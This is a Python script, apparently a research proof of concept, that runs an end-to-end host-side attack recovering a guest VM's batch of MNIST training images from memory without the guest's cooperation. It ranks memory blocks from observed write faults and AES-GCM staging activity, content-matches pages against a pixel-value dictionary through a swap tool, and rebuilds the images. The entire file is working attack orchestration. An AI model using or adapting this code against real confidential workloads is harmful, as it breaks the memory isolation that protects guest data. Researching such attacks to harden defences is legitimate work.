#!/usr/bin/env python3
"""
mnist_e2e.py — fully-blind MNIST batch-image recovery, no guest cooperation.

The guest loads one big DataLoader batch (--batch-size, default 512) and
blocks. --no-accel forces shuffle=False with a fixed seed, so batch N is
dataset[N*batch_size : (N+1)*batch_size] — deterministic and public. The
attack never trusts anything the guest prints:

  (A) write_pattern_tracker + Region-B (AES-GCM staging) precursor detection
      (orchestrate.detect_blind_candidates) ranks candidate blocks purely
      from host-observed write-fault GPAs — same method as orchestrate.py's
      existing --blind mode for batch_size=1.
  (B) A large batch places the whole input tensor (batch_size * 28*28*4
      contiguous bytes) starting at one candidate's run-start GPA. For each
      ranked candidate, mnist_dict_build.scan_block() content-matches every
      page against the reference-pixel dictionary; the real candidate shows
      much higher matched-chunk density over the tensor's byte span than any
      other candidate (or than background noise elsewhere in the block).
  (C) The winning candidate's matched-chunk grid is flattened byte-order and
      resliced into batch_size (28, 28) images. Unmatched pixel = -1.

Ground truth (labels only, never a GPA) is read from the host's own copy of
the public MNIST label file for grading. It plays no role in the recovery.

This targets main.py's REAL, unpatched behavior: transform =
Compose([ToTensor(), Normalize(0.1307, 0.3081)]) runs inside
Dataset.__getitem__ before collation, so the batch tensor is the
post-Normalize tensor (background -> -0.4242129..., not 0.0). Triggering
uses main_holder_norm.py (normalize=True below) -- NOT main_holder.py, which
patches Normalize to a no-op for the separate SparsityEncoder/V10Decoder
pipeline and would never match dict_cache_mnist.json's normalized-value
dictionary.

Run:  sudo python3 mnist_e2e.py --index 0 --batch-size 512
"""
import argparse
import json
import sys
from pathlib import Path

import numpy as np

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))                                    # orchestrate.py
sys.path.insert(0, str(HERE.parent / "dict"))                     # mnist_dict_build.py
sys.path.insert(0, str(HERE.parent.parent / "mura" / "dict"))     # mura_dict_build.py

import orchestrate as o                                            # noqa: E402
import mnist_dict_build as mdb                                     # noqa: E402
from mura_dict_build import acquire_gpa, CHUNK_SIZE                # noqa: E402

IMG_PIXELS = 28 * 28
IMG_BYTES = IMG_PIXELS * 4     # one normalized float32 image, contiguous
LABELS_PATH = HERE.parent / "model" / "data" / "MNIST" / "raw" / "train-labels-idx1-ubyte"


def read_gt_labels(index: int, batch_size: int) -> list[int]:
    off = index * batch_size
    with open(LABELS_PATH, "rb") as f:
        f.seek(8 + off)
        return list(f.read(batch_size))


def score_candidate(result: np.ndarray, batch_size: int) -> float:
    """Matched-chunk fraction inside the batch tensor's own byte span only
    (excludes the rest of the 2MB block, which is unrelated allocator
    content and would otherwise dilute or inflate the score)."""
    needed_chunks = (batch_size * IMG_BYTES + CHUNK_SIZE - 1) // CHUNK_SIZE
    flat = result.reshape(-1)[:needed_chunks]
    return float((flat >= 0).mean()) if len(flat) else 0.0


def reconstruct(result: np.ndarray, batch_size: int) -> np.ndarray:
    """Flatten the (PAGES_PER_BLOCK, CHUNKS_PAGE) matched-u8 grid into
    batch_size (28, 28) images. Each chunk = 4 contiguous pixels (16B/4B
    float32). -1 = pixel not recovered."""
    flat = np.repeat(result.reshape(-1).astype(np.int16), 4)
    need = batch_size * IMG_PIXELS
    if len(flat) < need:
        flat = np.pad(flat, (0, need - len(flat)), constant_values=-1)
    return flat[:need].reshape(batch_size, 28, 28)


def find_and_verify_block(index: int, batch_size: int, args, ref_dumps: dict,
                          fixed_gpa: int, pacer: "mdb.Pacer"):
    """Tracker-ranked candidates, each verified/reconstructed via content
    scan. Returns (block_base, result_grid, guest_proc); block_base/result
    are None if nothing usable was found.

    pacer is shared across every candidate's scan_block() call (see
    mnist_dict_build.Pacer) so the safety ceilings reflect this run's TOTAL
    swap volume, not just one candidate's -- may raise mdb.RunAborted."""
    _label, ranked, guest_proc = o.acquire_image_gpa_blind(
        index, args.tracker_path, args.blind_settle, args.blind_duration,
        use_main=True, batch_size=batch_size, normalize=True)
    if guest_proc is None:
        return None, None, None
    if not ranked:
        print(f"[!] [blind] no tracker candidates for index {index}", file=sys.stderr)
        return None, None, guest_proc

    top = ranked[:args.blind_top_n]
    best = None
    try:
        for rank, cand in enumerate(top, 1):
            base = cand["exact"]   # actual run-start GPA, not the 2MB floor
            print(f"[block] candidate #{rank}/{len(top)}: 0x{base:x} "
                  f"(tracker hits={cand['hits']} max_run={cand['max_run']})")
            result = mdb.scan_block(fixed_gpa, base, ref_dumps, args.swap_tool, pacer=pacer)
            s = score_candidate(result, batch_size)
            print(f"[block]   content match over batch-tensor span: {s*100:.1f}%"
                  f"  (cumulative swaps: {pacer.n})")
            if best is None or s > best[0]:
                best = (s, base, result)
            if s >= args.blind_match_threshold / 100:
                print(f"[block] ACCEPTED candidate #{rank} "
                      f"(score {s*100:.1f}% >= threshold {args.blind_match_threshold}%)")
                return base, result, guest_proc
    except mdb.RunAborted:
        # Still release the guest cleanly -- an aborted scan is not a crash,
        # the guest process is fine and blocked waiting on us.
        try:
            guest_proc.stdin.close()
            guest_proc.wait(timeout=15)
        except Exception:
            guest_proc.kill()
        raise

    print(f"[!] no candidate cleared {args.blind_match_threshold}%; "
          f"using best-scoring 0x{best[1]:x} ({best[0]*100:.1f}%)", file=sys.stderr)
    return best[1], best[2], guest_proc


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=0, help="DataLoader batch index (0-based)")
    p.add_argument("--batch-size", type=int, default=512)
    p.add_argument("--tracker-path", default=str(o.TRACKER_PATH))
    p.add_argument("--blind-settle", type=int, default=2)
    p.add_argument("--blind-duration", type=int, default=8)
    p.add_argument("--blind-top-n", type=int, default=5)
    p.add_argument("--blind-match-threshold", type=float, default=60.0)
    p.add_argument("--swap-tool", default=str(mdb.SWAP_TOOL))
    p.add_argument("--out", default=None,
                   help="output .npy for the recovered batch (default: recovered_<index>.npy)")
    args = p.parse_args()

    if not mdb.DICT_CACHE.exists():
        print(f"[!] {mdb.DICT_CACHE} missing -- run mnist_dict_build.py --build first",
              file=sys.stderr)
        return
    cache = json.load(open(mdb.DICT_CACHE))
    ref_dumps = mdb.load_ref_dumps(cache)
    print(f"[e2e] {len(ref_dumps)} reference pixel value(s) loaded: {sorted(ref_dumps)}")

    o.ensure_mtu_9000()
    fixed_gpa = acquire_gpa(None)
    print(f"[e2e] fresh fixed_gpa = 0x{fixed_gpa:x}")

    # One Pacer for the whole run -- shared across every candidate's
    # scan_block() call so MEGA-cooldown timing and MAX_TOTAL_SWAPS_RUN
    # reflect this run's TOTAL swap volume. See mnist_dict_build.Pacer.
    pacer = mdb.Pacer()
    guest_proc = None
    try:
        base, result, guest_proc = find_and_verify_block(
            args.index, args.batch_size, args, ref_dumps, fixed_gpa, pacer)
    except mdb.RunAborted as e:
        print(f"[!] {e} -- aborting for safety, not a bug to retry past "
              f"without investigating (see mnist_dict_build.Pacer)", file=sys.stderr)
        base, result = None, None

    try:
        if result is None:
            print(f"[!] recovery failed for index {args.index}", file=sys.stderr)
            return

        images = reconstruct(result, args.batch_size)
        gt = read_gt_labels(args.index, args.batch_size)
        recovered_frac = (images >= 0).reshape(args.batch_size, -1).mean(axis=1)

        out = args.out or f"recovered_{args.index}.npy"
        np.save(out, images)

        print("\n" + "=" * 68)
        print(f"  END-TO-END RESULT  (batch index {args.index}, batch_size {args.batch_size})")
        print("=" * 68)
        print(f"  candidate block     : 0x{base:x}")
        print(f"  GT labels[:16]      : {gt[:16]}{' ...' if len(gt) > 16 else ''}")
        print(f"  avg pixel recovery  : {recovered_frac.mean()*100:.1f}%")
        print(f"  images >=90% pixels : {int((recovered_frac >= 0.9).sum())}/{args.batch_size}")
        print(f"  images >=50% pixels : {int((recovered_frac >= 0.5).sum())}/{args.batch_size}")
        print(f"  saved               : {out}")
        print("=" * 68)
    finally:
        if guest_proc is not None:
            try:
                guest_proc.stdin.close()
                guest_proc.wait(timeout=15)
            except Exception:
                guest_proc.kill()


if __name__ == "__main__":
    main()
